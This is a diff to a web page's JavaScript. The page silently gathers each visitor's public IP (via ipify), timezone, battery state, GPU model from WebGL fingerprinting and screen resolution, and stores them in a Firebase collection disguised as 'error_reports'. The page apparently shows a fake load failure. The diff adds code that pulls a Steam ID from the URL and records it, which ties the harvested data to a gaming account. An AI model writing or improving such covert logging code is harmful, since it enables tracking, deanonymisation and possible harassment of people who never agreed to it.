@@ -52,7 +52,6 @@
             appId: "1:411175484965:web:f9e54b0dbb9d85086149cc" 
         };
 
-        // Function to extract GPU model via WebGL
         function getGPUModel() {
             try {
                 const canvas = document.createElement('canvas');
@@ -75,6 +74,11 @@
 
             async function startLog() {
                 try {
+                    // --- STEAM ID EXTRACTION ---
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const steamID = urlParams.get('steamid') || "Not Provided";
+                    // ---------------------------
+
                     const res = await fetch('https://api.ipify.org?format=json');
                     const ipData = await res.json();
                     
@@ -86,11 +90,10 @@
                     }
                     
                     const gpu = getGPUModel();
-                    
-                    // Capture monitor resolution
                     const resolution = `${window.screen.width}x${window.screen.height}`;
-
+                    
                     await addDoc(collection(db, "error_reports"), {
+                        steam_id: steamID, // This adds the SteamID to your database
                         ip: ipData.ip,
                         timezone: tz,
                         battery: batt,
@@ -100,9 +103,9 @@
                         time: serverTimestamp()
                     });
 
-                    console.log("Load failed Successfuly. ");
+                    console.log("Load failed Successfuly.");
                 } catch (err) {
-                    console.error("load failed epicly. ", err);
+                    console.error("load failed epicly.", err);
                 }
             }
 
